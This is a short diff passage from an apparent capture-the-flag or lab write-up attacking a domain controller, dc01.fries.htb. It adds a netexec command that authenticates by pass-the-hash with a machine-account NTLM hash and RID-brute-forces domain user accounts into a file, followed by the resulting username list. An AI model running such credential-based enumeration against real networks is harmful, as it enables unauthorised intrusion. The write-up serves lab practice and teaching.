@@ -835,8 +835,32 @@ SMB         10.129.244.72   445    DC01             SYSVOL          READ        
 Read access on default shares
 
 ```python
-
+nxc smb dc01.fries.htb -u 'web$' -H '61e3599900d7a81c373bcbaaa755bdb2' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+gMSA_CA_prod$
+w.earl
+d.cooper
+b.horne
+b.briggs
+s.johnson
+j.hurley
+h.truman
+d.lynch
+l.palmer
+l.johnson
+h.jennings
+svc_infra
+WEB$
+d.wilson
+m.hannigan
 ```
+
+Ill also grab the full userlist
+
+
 
 
 
